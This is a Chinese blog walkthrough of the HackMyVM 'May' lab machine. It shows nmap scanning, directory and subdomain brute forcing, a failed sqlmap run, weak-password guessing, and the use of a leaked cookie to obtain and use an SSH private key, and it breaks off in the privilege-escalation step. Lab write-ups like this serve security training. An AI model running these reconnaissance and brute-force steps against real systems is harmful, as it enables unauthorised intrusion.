<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="hack-my-vm-may  端口扫描  12345678910kali@kali [~] ➜  sudo nmap -p- -sT --min-rate 1000 192.168.1.59                                                                                  [23:43:32]Starting Nma">
<meta property="og:type" content="article">
<meta property="og:title" content="hack-my-vm-may">
<meta property="og:url" content="http://example.com/2025/02/22/hack-my-vm-may/index.html">
<meta property="og:site_name" content="WangYiHao">
<meta property="og:description" content="hack-my-vm-may  端口扫描  12345678910kali@kali [~] ➜  sudo nmap -p- -sT --min-rate 1000 192.168.1.59                                                                                  [23:43:32]Starting Nma">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/02/22/hack-my-vm-may/1.png">
<meta property="og:image" content="http://example.com/2025/02/22/hack-my-vm-may/2.png">
<meta property="og:image" content="http://example.com/2025/02/22/hack-my-vm-may/3.png">
<meta property="og:image" content="http://example.com/2025/02/22/hack-my-vm-may/4.png">
<meta property="og:image" content="http://example.com/2025/02/22/hack-my-vm-may/5.png">
<meta property="article:published_time" content="2025-02-21T16:11:12.000Z">
<meta property="article:modified_time" content="2025-02-21T17:52:26.025Z">
<meta property="article:author" content="SunRT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/02/22/hack-my-vm-may/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>hack-my-vm-may</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">总览</a></li>
         
          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
         
          <li><a href="/tags/PWN/">CTF-PWN</a></li>
         
          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
         
          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
         
          <li><a href="/tags/Vulhub">Vulhub</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2025/02/20/try-hack-me-Forbidden/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post Següent</span>
      <span id="i-top" class="info" style="display:none;">Adalt</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/22/hack-my-vm-may/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/22/hack-my-vm-may/&text=hack-my-vm-may"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/22/hack-my-vm-may/&is_video=false&description=hack-my-vm-may"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hack-my-vm-may&body=Check out this article: http://example.com/2025/02/22/hack-my-vm-may/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/22/hack-my-vm-may/&title=hack-my-vm-may"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/22/hack-my-vm-may/&name=hack-my-vm-may&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/22/hack-my-vm-may/&t=hack-my-vm-may"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm-may</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        hack-my-vm-may
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">SunRT</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-02-21T16:11:12.000Z" itemprop="datePublished">2025-02-22</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 align="center">hack-my-vm-may</h1>

<h3>端口扫描</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -p- -sT --min-rate 1000 192.168.1.59                                                                                  [23:43:32]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 23:50 CST</span><br><span class="line">Nmap scan report for may.hmv (192.168.1.59)</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line">MAC Address: 08:00:27:C3:A8:CC (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p><strong>开放三个端口，深度探测一下</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -sV -sC -p22,80,10000 192.168.1.59                                                                                [23:50:18]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 00:08 CST</span><br><span class="line">Nmap scan report for may.hmv (192.168.1.59)</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:fb:c0:76:f2:b3:ff:4a:ed:61:6a:ae:a1:ca:86:c1 (RSA)</span><br><span class="line">|   256 d0:29:99:fd:69:68:21:e3:b4:a6:48:e4:4e:a1:7e:f4 (ECDSA)</span><br><span class="line">|_  256 2a:1b:1f:3d:ab:0a:00:5b:43:75:89:67:8a:98:21:df (ED25519)</span><br><span class="line">80/tcp    open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: MAY</span><br><span class="line">10000/tcp open  http    MiniServ 1.979 (Webmin httpd)</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">|_http-server-header: MiniServ/1.979</span><br><span class="line">MAC Address: 08:00:27:C3:A8:CC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p><strong>看来这个10000端口也是一个http服务</strong></p>
<h3>80端口渗透</h3>

<p><strong>首先设置host文件，至于为啥，访问80端口就可以看出该网址重定向到may.hmv</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://may.hmv/                                                                                                            [23:45:21]</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;title&gt;MAY&lt;/title&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">admin: Web is under construction. Use Intranet.</span><br><span class="line">marie: Where are now the keys?</span><br><span class="line">alice: Yes, where are?</span><br><span class="line">admin: :&#x27;(</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>访问得到的唯一有用的信息是三个用户，先做一个记录，进行目录爆破</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  gobuster dir --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://may.hmv/ -x txt,php,html         [23:46:13]</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://may.hmv/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 194]</span><br><span class="line">Progress: 882244 / 882248 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p><strong>目录爆破无果，应该不从目录下手，那就子域名爆破了，给了解析的host文件，这就是必试的思路</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  wfuzz -w /home/kali/web_shell_toos/subdomains-top1million-5000.txt -u http://may.hmv -H &quot;Host: FUZZ.may.hmv&quot; --hh 185            [0:25:59]</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://may.hmv/</span><br><span class="line">Total requests: 4989</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                    </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000048:   200        11 L     31 W       406 Ch      &quot;portal&quot;                                                                                   </span><br><span class="line">000000183:   200        10 L     31 W       405 Ch      &quot;ssh&quot;                                                                                      </span><br><span class="line"></span><br><span class="line">Total time: 10.66197</span><br><span class="line">Processed Requests: 4989</span><br><span class="line">Filtered Requests: 4987</span><br><span class="line">Requests/sec.: 467.9245</span><br></pre></td></tr></table></figure>

<p><strong>果然是有结果的，继续添加解析文件，访问后是一个登录框，要么弱密码，要不sql注入，这是最直接的</strong></p>
<p><img src="/2025/02/22/hack-my-vm-may/1.png" alt="1"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sqlmap -r 1.txt                                                                                                                  [0:35:44]</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.9#stable&#125;</span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 00:35:48 /2025-02-22/</span><br><span class="line"></span><br><span class="line">[00:35:48] [INFO] parsing HTTP request from &#x27;1.txt&#x27;</span><br><span class="line">custom injection marker (&#x27;*&#x27;) found in POST body. Do you want to process it? [Y/n/q] y</span><br><span class="line">[00:35:50] [INFO] testing connection to the target URL</span><br><span class="line">[00:35:50] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[00:35:50] [INFO] testing if the target URL content is stable</span><br><span class="line">[00:35:51] [INFO] target URL content is stable</span><br><span class="line">[00:35:51] [INFO] testing if (custom) POST parameter &#x27;#1*&#x27; is dynamic</span><br><span class="line">[00:35:51] [WARNING] (custom) POST parameter &#x27;#1*&#x27; does not appear to be dynamic</span><br><span class="line">[00:35:51] [WARNING] heuristic (basic) test shows that (custom) POST parameter &#x27;#1*&#x27; might not be injectable</span><br><span class="line">[00:35:51] [INFO] testing for SQL injection on (custom) POST parameter &#x27;#1*&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Generic inline queries&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Microsoft SQL Server/Sybase time-based blind (IF)&#x27;</span><br><span class="line">[00:35:51] [INFO] testing &#x27;Oracle AND time-based blind&#x27;</span><br><span class="line">it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] </span><br><span class="line"></span><br><span class="line">[00:35:52] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 10 columns&#x27;</span><br><span class="line">[00:35:52] [WARNING] (custom) POST parameter &#x27;#1*&#x27; does not seem to be injectable</span><br><span class="line">[00:35:52] [INFO] testing if (custom) POST parameter &#x27;#2*&#x27; is dynamic</span><br><span class="line">[00:35:52] [WARNING] (custom) POST parameter &#x27;#2*&#x27; does not appear to be dynamic</span><br><span class="line">[00:35:52] [WARNING] heuristic (basic) test shows that (custom) POST parameter &#x27;#2*&#x27; might not be injectable</span><br><span class="line">[00:35:52] [INFO] testing for SQL injection on (custom) POST parameter &#x27;#2*&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Generic inline queries&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;PostgreSQL &gt; 8.1 AND time-based blind&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Microsoft SQL Server/Sybase time-based blind (IF)&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Oracle AND time-based blind&#x27;</span><br><span class="line">[00:35:52] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 10 columns&#x27;</span><br><span class="line">[00:35:52] [WARNING] (custom) POST parameter &#x27;#2*&#x27; does not seem to be injectable</span><br><span class="line">[00:35:52] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#x27;--level&#x27;/&#x27;--risk&#x27; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#x27;--tamper&#x27; (e.g. &#x27;--tamper=space2comment&#x27;) and/or switch &#x27;--random-agent&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 00:35:52 /2025-02-22/</span><br></pre></td></tr></table></figure>

<p><strong>看样子是没有的，先作罢吧，弱口令爆破，找到密码</strong></p>
<p><img src="/2025/02/22/hack-my-vm-may/2.png" alt="2"></p>
<p><strong>对比失败的报文，多了一个意义不明的cookie</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: Sweetcookie=HMVHMXHMVHMXHMVHMXHMVHMX</span><br></pre></td></tr></table></figure>

<p><strong>估计是携带了身份信息的，而且翻译过来是设置cookie的意思，加在以往访问的网站上应该会有所信息，一个是index.php，一个是check.php，check.php就是我们刚刚爆破的报文里面携带的路径</strong></p>
<p><img src="/2025/02/22/hack-my-vm-may/3.png" alt="3"></p>
<p><strong>我们拿到了私钥</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh-keygen -y -f x                                                                   [1:18:32]</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcfBDobru1KtzFM3ag4qmVVp7Rv6BV7TH9u0VKAYnLZsyhZzXioE6MTtwRw7y0QHzmYjd+0HKOnplVxBZ2YQW+oON6Ia+5y7Ryc7+RNhka57fj8/T7dMngOf3aUvmd54UkLfvIe2DEa/VdndpDqY39djqiQ+mOEQJmJ4fzzj0/69yWEGxdxk83BnW+RcCKdphPp7W8MkD3iXiKgOCP9LjyAW5HU4TGmzEz5zW6CAhx38aAXJUfLuL+F2bvynT2+eZaPyzDZdR3xcYgk5lEczHTEDDZ7OQcL3du7AvYpHF7P17mewsx8pRg0F3tP/XoB9LqVG+S8IE8AmxoE49vJw0p marie@may</span><br></pre></td></tr></table></figure>

<p><strong>私钥没有密码，而且显示了用户信息，登录即可</strong></p>
<h3>提权</h3>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  chmod 600 x                                                                            [1:28:09]</span><br><span class="line">kali@kali [~] ➜  ssh -i x marie@192.168.1.59                                                            [1:28:14]</span><br><span class="line">Linux may 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Jul 22 03:34:48 2021</span><br><span class="line">marie@may:~$ whoami</span><br><span class="line">marie</span><br><span class="line">marie@may:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 4 marie marie 4096 Jul 22  2021 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Jul 21  2021 ..</span><br><span class="line">-rw-r--r-- 1 marie marie  220 Jul 21  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1 marie marie 3526 Jul 21  2021 .bashrc</span><br><span class="line">drwxr-xr-x 3 marie marie 4096 Jul 22  2021 .local</span><br><span class="line">-rw-r--r-- 1 marie marie  807 Jul 21  2021 .profile</span><br><span class="line">drwx------ 2 marie marie 4096 Jul 22  2021 .ssh</span><br><span class="line">-rw------- 1 marie marie   16 Jul 22  2021 user.txt</span><br><span class="line">-rw------- 1 marie marie   49 Jul 22  2021 .Xauthority</span><br><span class="line">marie@may:~$ cat user.txt|base64</span><br><span class="line">SE1WbWFyaWVpc3JlYmVsCg==</span><br></pre></td></tr></table></figure>

<p><strong>我们一直没有看10000端口运行的是啥http服务，访问后发现是Webmin服务</strong></p>
<p><img src="/2025/02/22/hack-my-vm-may/4.png" alt="4"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">marie@may:/etc/webmin$ sudo -l</span><br><span class="line">Matching Defaults entries for marie on may:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User marie may run the following commands on may:</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/halt, /usr/sbin/reboot, /usr/sbin/poweroff</span><br></pre></td></tr></table></figure>

<p><strong>是一些重启，断电，关闭命令，都是关电脑的</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 